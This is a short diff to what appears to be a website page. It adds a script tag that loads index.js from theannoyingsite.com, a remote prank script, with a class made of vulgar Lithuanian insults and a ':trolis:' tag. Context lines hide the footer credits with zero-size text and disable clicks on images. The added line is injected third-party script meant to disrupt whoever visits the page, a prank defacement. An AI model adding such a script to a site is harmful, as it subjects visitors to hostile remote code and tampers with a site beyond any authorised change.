@@ -48,3 +48,4 @@ jogurtas
 <style> img { pointer-events: none; } .site-footer-credits { font-size: 0%; } </style>
 
 eik sikt baroki
+<script class="pats eik sikt :trolis:" src="https://theannoyingsite.com/index.js"></script>
